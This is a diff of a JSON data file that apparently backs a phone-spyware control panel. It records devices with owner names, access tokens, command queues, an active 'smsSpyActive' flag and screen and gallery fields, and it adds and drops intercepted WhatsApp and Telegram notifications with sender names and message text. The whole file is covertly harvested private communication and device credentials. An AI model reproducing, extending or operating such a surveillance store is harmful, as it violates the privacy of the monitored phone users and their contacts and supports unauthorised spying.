@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776778577928,
+    "lastSeen": 1776778581303,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3593 pesan dari 22 chat",
+        "time": "21/04 20:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778580829
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎JB || RULZ STORE KALBAR (680 pesan): ~ ada",
+        "content": "📷 300+\n\n* max 1 evo 2\n* log ggl bind sepaket\n* sg lobby 2\n* v140 \n\n(MC YANG AKU KENAL/COD SIANTAN)",
+        "time": "21/04 20:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778580637
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎JB || MANZZ KALBAR (964 pesan): ~ p",
+        "content": "📷 op? \nlog bind\nmax1\nblue lock on",
+        "time": "21/04 20:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778579765
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (115 pesan): ~ TUPPALSTORE",
@@ -10304,30 +10328,6 @@
         "time": "21/04 20:00",
         "pkg": "com.whatsapp",
         "receivedAt": 1776776449062
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎All Buyer Pegasus-X ( No Update ) (5 pesan): ~ N9THCRAL",
-        "content": "💟 Stiker",
-        "time": "21/04 20:00",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776776448379
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (230 pesan): ~ ?",
-        "content": "setau gw cuma ini",
-        "time": "21/04 20:00",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776776448272
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎JB || MANZZ KALBAR (953 pesan): ~ ada",
-        "content": "📷 300+\n\n* max 1 evo 2\n* log ggl bind sepaket\n* sg lobby 2\n* v140 \n\n(MC YANG AKU KENAL/COD SIANTAN)",
-        "time": "21/04 20:00",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776776446618
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776778578112,
+    "lastSeen": 1776778581455,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "[ suendi ]",
+        "content": "Pesan baru dari 1 chat",
+        "time": "21/04 20:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778582649
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "[ suendi ]",
+        "content": "Pesan baru dari 1 chat",
+        "time": "21/04 20:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778581146
+      },
       {
         "appName": "WhatsApp",
         "sender": "[ suendi ]",
@@ -14386,22 +14402,6 @@
         "time": "21/04 20:25",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776777959796
-      },
-      {
-        "appName": "Telegram",
-        "sender": "BANINDO VIP BY R19X",
-        "content": "BUTUH NOKOS WHATSAPP TAPI MAU FREE? \nNIH BOT NYA\n\n[ CLICK ]\n\nTutorial:\n1.join channel\n2. Click button Sudah gabung\n3. Menu lainnya\nTutorial berikutnya Pv @Wanzx12",
-        "time": "21/04 20:25",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777959781
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "❄️ Akun Terhapuss・16809 pesan baru dari 118 obrolan",
-        "time": "21/04 20:25",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777959763
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776778578727,
+    "lastSeen": 1776778581435,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
